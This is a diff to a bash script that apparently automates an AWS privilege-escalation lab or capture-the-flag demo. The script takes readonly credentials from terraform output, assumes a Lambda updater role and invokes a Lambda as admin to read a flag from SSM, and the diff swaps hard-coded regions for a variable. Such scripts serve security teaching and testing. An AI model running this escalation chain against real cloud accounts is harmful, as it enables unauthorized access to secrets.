@@ -58,6 +58,7 @@ fi
 cd ../../../../../..  # Navigate to root of terraform project
 READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
 READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "us-east-1")
 
 if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
     echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
@@ -109,7 +110,7 @@ fi
 export AWS_ACCESS_KEY_ID=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SessionToken')
-export AWS_DEFAULT_REGION="us-west-2"
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo -e "${GREEN}✓ Successfully assumed dev lambda-prod-updater role${NC}"
 echo ""
@@ -263,7 +264,7 @@ if [ $? -eq 0 ]; then
             BODY_JSON=$(cat /tmp/lambda_response.json | jq -r '.body // empty')
             FLAG_VALUE=$(echo "$BODY_JSON" | jq -r '.flag // empty' 2>/dev/null)
 
-            show_attack_cmd "Attacker (Lambda as admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text --region us-east-1"
+            show_attack_cmd "Attacker (Lambda as admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text --region $AWS_REGION"
 
             if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "null" ]; then
                 echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
